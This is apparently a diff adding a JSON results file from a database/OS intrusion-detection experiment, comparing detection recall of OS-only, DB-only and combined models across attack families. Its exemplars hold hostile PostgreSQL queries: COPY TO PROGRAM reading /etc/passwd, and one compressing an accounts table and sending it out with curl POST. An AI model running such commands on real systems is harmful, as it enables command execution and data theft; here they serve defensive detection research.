@@ -1,0 +1,191 @@
+{
+  "metadata": {
+    "experiment": "Section 3: Attack-Family Analysis (OS-dominant vs DB-dominant vs Cross-layer)",
+    "splits_evaluated": [
+      "dataset_test",
+      "dataset_dev"
+    ],
+    "total_sessions_evaluated": 8587,
+    "total_attacks_evaluated": 3800,
+    "normal_sample_count": 4787,
+    "alert_threshold": 0.65,
+    "response_threshold": 0.8,
+    "model_path": "D:\\Code\\College\\Mini Project\\CASCE_IMPLEMENTATION\\casce_gat.pt"
+  },
+  "families": {
+    "OS-dominant": {
+      "sample_count": 618,
+      "os_only": {
+        "detected_count": 452,
+        "recall": 0.7314,
+        "miss_rate": 0.2686,
+        "mean_risk": 0.6838
+      },
+      "db_only": {
+        "detected_count": 65,
+        "recall": 0.1052,
+        "miss_rate": 0.8948,
+        "mean_risk": 0.5729
+      },
+      "casce": {
+        "detected_count": 542,
+        "recall": 0.877,
+        "miss_rate": 0.123,
+        "mean_risk": 0.7167
+      }
+    },
+    "DB-dominant": {
+      "sample_count": 561,
+      "os_only": {
+        "detected_count": 0,
+        "recall": 0.0,
+        "miss_rate": 1.0,
+        "mean_risk": 0.5492
+      },
+      "db_only": {
+        "detected_count": 80,
+        "recall": 0.1426,
+        "miss_rate": 0.8574,
+        "mean_risk": 0.5776
+      },
+      "casce": {
+        "detected_count": 93,
+        "recall": 0.1658,
+        "miss_rate": 0.8342,
+        "mean_risk": 0.5839
+      }
+    },
+    "Cross-layer": {
+      "sample_count": 2621,
+      "os_only": {
+        "detected_count": 1778,
+        "recall": 0.6784,
+        "miss_rate": 0.3216,
+        "mean_risk": 0.6799
+      },
+      "db_only": {
+        "detected_count": 101,
+        "recall": 0.0385,
+        "miss_rate": 0.9615,
+        "mean_risk": 0.5582
+      },
+      "casce": {
+        "detected_count": 1891,
+        "recall": 0.7215,
+        "miss_rate": 0.2785,
+        "mean_risk": 0.6933
+      }
+    }
+  },
+  "overall_metrics": {
+    "os_only": {
+      "true_positives": 2230,
+      "false_positives": 1,
+      "false_negatives": 1570,
+      "true_negatives": 4786,
+      "precision": 0.9996,
+      "recall": 0.5868,
+      "f1_score": 0.7395,
+      "accuracy": 0.817,
+      "fpr": 0.0002
+    },
+    "db_only": {
+      "true_positives": 246,
+      "false_positives": 0,
+      "false_negatives": 3554,
+      "true_negatives": 4787,
+      "precision": 1.0,
+      "recall": 0.0647,
+      "f1_score": 0.1216,
+      "accuracy": 0.5861,
+      "fpr": 0.0
+    },
+    "casce": {
+      "true_positives": 2526,
+      "false_positives": 2,
+      "false_negatives": 1274,
+      "true_negatives": 4785,
+      "precision": 0.9992,
+      "recall": 0.6647,
+      "f1_score": 0.7984,
+      "accuracy": 0.8514,
+      "fpr": 0.0004
+    }
+  },
+  "exemplars": {
+    "OS-dominant": {
+      "session_id": "108860",
+      "filename": "enriched_session_108860_OS_Privilege_Escalation.graphml",
+      "raw_label": "OS Privilege Escalation",
+      "family": "OS-dominant",
+      "is_normal": false,
+      "query": "COPY (SELECT 1) TO PROGRAM 'cat /etc/passwd > /tmp/out_cat_passwd.txt 2>/dev/null || true';",
+      "tables": [],
+      "proc_count": 3,
+      "file_count": 23,
+      "endpoint_count": 0,
+      "os_risk": 0.75,
+      "os_detected": true,
+      "os_status": "alert",
+      "db_risk": 0.549,
+      "db_detected": false,
+      "db_status": "benign",
+      "casce_risk": 0.75,
+      "casce_detected": true,
+      "casce_status": "alert",
+      "casce_rule": null
+    },
+    "DB-dominant": {
+      "session_id": "115130",
+      "filename": "enriched_session_115130_Attack.graphml",
+      "raw_label": "Attack",
+      "family": "DB-dominant",
+      "is_normal": false,
+      "query": "SELECT pg_sleep(2);",
+      "tables": [],
+      "proc_count": 1,
+      "file_count": 9,
+      "endpoint_count": 0,
+      "os_risk": 0.5822,
+      "os_detected": false,
+      "os_status": "benign",
+      "db_risk": 0.7409,
+      "db_detected": true,
+      "db_status": "alert",
+      "casce_risk": 0.7385,
+      "casce_detected": true,
+      "casce_status": "alert",
+      "casce_rule": null
+    },
+    "Cross-layer": {
+      "session_id": "116920",
+      "filename": "enriched_session_116920_Data_Exfiltration.graphml",
+      "raw_label": "Data Exfiltration",
+      "family": "Cross-layer",
+      "is_normal": false,
+      "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'sleep 30 && gzip > /tmp/accounts_exfil_c.gz && curl -s -X POST -d @/tmp/accounts_exfil_c.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+      "tables": [
+        "('Table', 'pgbench_accounts')"
+      ],
+      "proc_count": 5,
+      "file_count": 61,
+      "endpoint_count": 1,
+      "os_risk": 0.75,
+      "os_detected": true,
+      "os_status": "alert",
+      "db_risk": 0.549,
+      "db_detected": false,
+      "db_status": "benign",
+      "casce_risk": 0.75,
+      "casce_detected": true,
+      "casce_status": "alert",
+      "casce_rule": null
+    }
+  },
+  "raw_counts": {
+    "OS-dominant": 618,
+    "DB-dominant": 561,
+    "Cross-layer": 2621,
+    "Normal": 4787
+  }
+}
